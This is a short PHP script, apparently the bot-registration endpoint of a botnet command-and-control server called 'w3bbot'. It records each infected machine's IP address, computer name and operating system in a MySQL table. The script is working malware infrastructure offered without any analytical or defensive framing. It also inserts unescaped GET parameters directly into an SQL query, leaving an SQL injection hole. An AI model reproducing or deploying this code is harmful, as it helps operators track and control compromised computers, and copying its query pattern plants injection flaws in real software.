<?php

	//Mysql credentials:
	$mysql_host = "127.0.0.1";
	$mysql_user = "";
	$mysql_pass = "";

	//Get information of bot and save this in database:
	$bot_ip = $_SERVER["REMOTE_ADDR"];
	$bot_pcname = $_GET["bname"];
	$bot_os = $_GET["bos"];

	$mcon = mysql_connect($mysql_host, $mysql_user, $mysql_pass);

	if($bot_pcname != null and $bot_pcname != "" and $bot_os != null and $bot_os != ""){
		mysql_select_db("w3bbot", $mcon);
		mysql_query("INSERT INTO bots(bot_ip, bot_pcname, bot_os) VALUES('$bot_ip', '$bot_pcname', '$bot_os')", $mcon);
		}

?>
